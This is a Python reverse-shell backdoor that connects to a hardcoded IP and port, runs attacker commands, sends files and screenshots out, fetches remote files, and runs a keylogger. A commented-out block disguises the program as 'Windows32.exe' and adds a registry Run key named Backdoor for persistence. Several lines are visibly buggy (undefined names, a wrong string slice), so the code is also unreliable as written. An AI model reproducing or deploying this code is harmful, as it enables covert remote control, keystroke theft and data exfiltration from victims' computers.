import socket
import subprocess
import json
import os 
import base64
import shutil
import sys
import keylogger
import threading
import time
import requests
from mss import mss

def is_admin():
	global admin
	try:
		temp=os.listdir(os.sep.join([os.environ.get('SystemRoot', 'c:\windows'),'temp']))
	except:
		admin='!User Previledges!'
	else:
		admin='Administrator Previledges!'

def screenshot():
	with mss () as screenshot:
		screenshot.shot()
	
def download(url):
	get_response=requests.get(url)
	file_name=url.split('/')[-1]
	with open(filename,'wb') as out_file:
		out_file.write(get_response.content)
	
def reliable_send(data):
	json_data = json.dumps(data)
	client.send(json_data.encode())

def reliable_recv():
	data = ''
	while True:
        	try:
            		data = data + client.recv(1024).decode()
            		return json.loads(data)
        	except ValueError:
            		continue



def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			continue
		elif command =='help':
			help_options= '''					
					download path -->>Download a file from the target PC
					upload path->>Upload a file to the target PC
					screenshot-->Screenshot a file from target PC
					start path-->Start a service from target PC
					get url-->Download a file from the internet to the target PC
					check-->Check for Adminisrtator previledges in the target PC
					cd path-->Change directory in the target pc
					q-->Exit the reverse shell
					keylog_start-->start keylogger
					keylog_dump-->Dump the keystrokes
			
					'''
			reliable_send(help_options)		
			
		elif command[:2] =='cd' and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:10]=='screenshot':
			try:
				screenshot()
				with open('monitor-1.png','rb') as sc:
					reliable_send(base64.b64encode(sc.read()))
					os.remove('monitor-1.png') 
			except:
				reliable_send('Failed to take screenshot')
		elif command[:5]=='start':
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable.send(f'started {command[6:]}')
			except:	
				reliable.send('Failed to start')
		elif command[:4]=='check':
			try:
				is_admin()
				reliable.send(admin)
			except:
				reliable.send('!failed to perform the action')
		elif command[:12]=='keylog_start':
			t1=threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11]=='keylog_dump':
			fn=open(keylogger_path,'r')
			reliable_send(fn.read())
		elif command[:3]=='get':
			try:
				download(command[4:])
				reliable.send('[+]Downloaded file from specified url')
			except:		
				reliable.send('[+] Failed to get file from specified url')
		elif command[:8] =='download':
			with open (command[9:],'rb') as  file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6]=='upload':
			with open(command[7:],'wb') as fin:
				file_data=result_recv
				file.write(base64.b64decode(file_data))
		else:
            		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            		result = proc.stdout.read() + proc.stderr.read()
            		reliable_send(result.decode())
#UNHASH below when running on windows os 

#location=os.environ('appdata') +  '\\Windows32.exe'
#if not os.path.exists(location):
	#shutil.copyfile(sys.executable, location)
	#subprocess.call('reg add HkCU\Software\Microsoft\Windows\Currentversions\Run /v Backdoor t/ REG_SZ /d "' + location + '"', shell=True')
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.199.130', 54321))
shell()
client.close()
